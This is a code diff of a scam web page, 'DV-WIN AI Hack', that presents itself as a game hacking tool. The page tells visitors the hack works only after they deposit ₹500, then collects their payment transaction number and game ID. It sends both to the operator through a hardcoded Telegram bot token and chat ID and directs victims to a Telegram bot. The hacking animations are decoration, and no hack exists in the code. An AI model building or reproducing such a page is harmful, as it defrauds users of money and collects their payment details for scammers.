@@ -1,51 +1,345 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DV-WIN AI Hack</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DV-WIN AI Hack</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #0a0a0a;
+      color: #00ff00;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .screen {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: absolute;
+      top: 0;
+      left: 0;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease-in-out, visibility 0.5s ease-in-out;
+      flex-direction: column;
+    }
+
+    .screen.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .welcome-content, .payment-content {
+      text-align: center;
+      padding: 20px;
+      background-color: rgba(0, 255, 0, 0.05);
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+      border: 1px solid #00ff00;
+      backdrop-filter: blur(5px);
+    }
+
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+    }
+
+    .notice, .notice-toast {
+      margin: 20px auto;
+      padding: 15px;
+      background-color: rgba(255, 0, 0, 0.1);
+      border: 1px solid #ff0000;
+      border-radius: 5px;
+      width: 80%;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.4);
+    }
+
+    .notice p, .notice-toast p {
+      margin-top: 10px;
+      font-size: 0.9em;
+    }
+
+    .icon {
+      color: #ff0000;
+      font-weight: bold;
+      margin: 0 5px;
+    }
+
+    button {
+      background-color: #00ff00;
+      color: #0a0a0a;
+      border: none;
+      padding: 12px 25px;
+      font-size: 1.1em;
+      border-radius: 5px;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ff00;
+      transition: all 0.3s ease;
+      margin-top: 15px;
+    }
+
+    button:hover {
+      background-color: #00cc00;
+      box-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00;
+    }
+
+    #activate-hack-btn {
+      font-size: 1.3em;
+      font-weight: bold;
+    }
+
+    .bubble-button {
+      background-color: rgba(0, 255, 0, 0.2);
+      border: 1px solid #00ff00;
+      color: #00ff00;
+      padding: 10px 20px;
+      font-size: 1em;
+      margin-bottom: 30px;
+    }
+
+    .bubble-button:hover {
+      background-color: rgba(0, 255, 0, 0.4);
+      box-shadow: 0 0 15px #00ff00;
+    }
+
+    #utr-details-form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    #utr-details-form input[type="text"] {
+      width: 80%;
+      padding: 12px;
+      border: 1px solid #00ff00;
+      background-color: rgba(0, 255, 0, 0.1);
+      color: #00ff00;
+      border-radius: 5px;
+      font-size: 1em;
+      outline: none;
+      text-align: center;
+    }
+
+    #utr-details-form input[type="text"]:focus {
+      box-shadow: 0 0 15px #00ff00;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    #rain-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .hacking-text {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 1.5em;
+      font-weight: bold;
+      margin: 10px 0;
+      letter-spacing: 2px;
+      text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00;
+    }
+
+    .hacking-text.random-chainice {
+      font-size: 1.2em;
+      font-style: italic;
+      text-shadow: 0 0 3px #00ff00;
+    }
+
+    .welcome-content .hacking-text,
+    .payment-content .hacking-text {
+      margin-top: 30px;
+    }
+  </style>
 </head>
 <body>
 
-    <!-- Welcome Screen -->
-    <div id="welcome-screen" class="screen active">
-        <div class="welcome-content">
-            <h1>Welcome To DV-WIN AI Hack!</h1>
-            <div class="notice">
-                <span class="icon">⭕</span> Important Notice <span class="icon">⭕</span>
-                <p>This hack system will only work when you deposit a minimum of ₹500 from this system!</p>
-            </div>
-            <button id="activate-hack-btn">Active Hack</button>
-        </div>
+  <!-- Welcome Screen -->
+  <div id="welcome-screen" class="screen active">
+    <div class="welcome-content">
+      <h1>Welcome To DV-WIN AI Hack!</h1>
+      <div class="notice">
+        <span class="icon">⭕</span> Important Notice <span class="icon">⭕</span>
+        <p>This hack system will only work when you deposit a minimum of ₹500 from this system!</p>
+      </div>
+      <button id="activate-hack-btn">Active Hack</button>
     </div>
+  </div>
 
-    <!-- Payment Screen -->
-    <div id="payment-screen" class="screen">
-        <div class="payment-content">
-            <div class="notice-toast">
-                <span class="icon">📢</span> Important Notice (Read This) <span class="icon">🔊</span>
-                <p>This hack system will only work when you deposit a minimum of ₹500 from this system!</p>
-            </div>
+  <!-- Payment Screen -->
+  <div id="payment-screen" class="screen">
+    <div class="payment-content">
+      <div class="notice-toast">
+        <span class="icon">📢</span> Important Notice (Read This) <span class="icon">🔊</span>
+        <p>This hack system will only work when you deposit a minimum of ₹500 from this system!</p>
+      </div>
 
-            <button id="submit-utr-bubble-btn" class="bubble-button">Submit UTR No</button>
+      <button id="submit-utr-bubble-btn" class="bubble-button">Submit UTR No</button>
 
-            <div id="utr-details-form" class="hidden">
-                <input type="text" id="utr-input" placeholder="Enter UTR No or Trx ID (12 digit)">
-
-                <!-- Screenshot Upload Area -->
-                <div class="file-upload-area">
-                    <label for="screenshot-upload" class="upload-label">Select Payment Screenshot</label>
-                    <input type="file" id="screenshot-upload" accept="image/*">
-                    <span id="file-name">No file chosen</span>
-                </div>
-
-                <input type="text" id="game-id-input" placeholder="Enter Game ID">
-                <button id="submit-payment-btn">Submit</button>
-            </div>
-        </div>
+      <div id="utr-details-form" class="hidden">
+        <input type="text" id="utr-input" placeholder="Enter UTR No or Trx ID (12 digit)">
+        <input type="text" id="game-id-input" placeholder="Enter Game ID">
+        <button id="submit-payment-btn">Submit</button>
+      </div>
     </div>
+  </div>
 
-    <script src="script.js"></script>
+  <!-- JavaScript -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const welcomeScreen = document.getElementById('welcome-screen');
+      const paymentScreen = document.getElementById('payment-screen');
+      const activateHackBtn = document.getElementById('activate-hack-btn');
+      const submitUtrBubbleBtn = document.getElementById('submit-utr-bubble-btn');
+      const utrDetailsForm = document.getElementById('utr-details-form');
+      const submitPaymentBtn = document.getElementById('submit-payment-btn');
+
+      // Rain Effect
+      const canvas = document.createElement('canvas');
+      canvas.id = 'rain-canvas';
+      document.body.prepend(canvas);
+      const ctx = canvas.getContext('2d');
+      let drops = [];
+      const numberOfDrops = 1000;
+
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+
+      function createDrops() {
+        for (let i = 0; i < numberOfDrops; i++) {
+          drops.push({
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height,
+            speed: Math.random() * 5 + 1,
+            length: Math.random() * 20 + 5,
+            wind: Math.random() * 0.3 - 0.15
+          });
+        }
+      }
+
+      function drawRain() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#00ff00';
+
+        for (let i = 0; i < drops.length; i++) {
+          const drop = drops[i];
+          ctx.beginPath();
+          ctx.moveTo(drop.x, drop.y);
+          ctx.lineTo(drop.x + drop.wind * drop.length, drop.y + drop.length);
+          ctx.lineWidth = 1;
+          ctx.stroke();
+
+          drop.y += drop.speed;
+          drop.x += drop.wind;
+
+          if (drop.y > canvas.height) {
+            drops[i] = {
+              x: Math.random() * canvas.width,
+              y: -drop.length,
+              speed: Math.random() * 5 + 1,
+              length: Math.random() * 20 + 5,
+              wind: Math.random() * 0.3 - 0.15
+            };
+          }
+        }
+      }
+
+      function animateRain() {
+        drawRain();
+        requestAnimationFrame(animateRain);
+      }
+
+      createDrops();
+      animateRain();
+
+      window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        drops = [];
+        createDrops();
+      });
+
+      // UI Logic
+      activateHackBtn.addEventListener('click', () => {
+        welcomeScreen.classList.remove('active');
+        paymentScreen.classList.add('active');
+      });
+
+      submitUtrBubbleBtn.addEventListener('click', () => {
+        utrDetailsForm.classList.toggle('hidden');
+        submitUtrBubbleBtn.textContent = utrDetailsForm.classList.contains('hidden') ? 'Submit UTR No' : 'Hide Details';
+      });
+
+      submitPaymentBtn.addEventListener('click', () => {
+  const utr = document.getElementById('utr-input').value.trim();
+  const gameId = document.getElementById('game-id-input').value.trim();
+
+  if (!utr || !gameId) {
+    alert('Please fill in all details!');
+    return;
+  }
+
+  // Telegram Send
+  const botToken = '8001601584:AAH9-edJlgkfdcPUBLVLZmqdEns2g_SRa_A';
+  const chatId = '6879212044';
+  const message = `🚨 New DV-WIN Payment Submission 🚨\n\n🔐 UTR No: ${utr}\n🎮 Game ID: ${gameId}`;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.ok) {
+      alert('✅ Please wait for 1–2 hours...\n📸 Now send your payment screenshot to DV-VIN BOT!');
+      window.open('https://t.me/DW_WIN_BOT', '_blank');
+    } else {
+      alert('❌ Telegram API failed.');
+    }
+  })
+  .catch(err => {
+    console.error('Telegram Error:', err);
+    alert('⚠️ Network error!');
+  });
+});
+
+      // Extra Hacking Text
+      const welcomeContent = document.querySelector('#welcome-screen .welcome-content');
+      const hackingText1 = document.createElement('div');
+      hackingText1.className = 'hacking-text';
+      hackingText1.textContent = 'Hacking';
+
+      const hackingText2 = document.createElement('div');
+      hackingText2.className = 'hacking-text random-chainice';
+      hackingText2.textContent = 'Hacking Random Chainice';
+
+      welcomeContent.appendChild(hackingText1);
+      welcomeContent.appendChild(hackingText2);
+    });
+  </script>
 </body>
-  </html>
+</html>
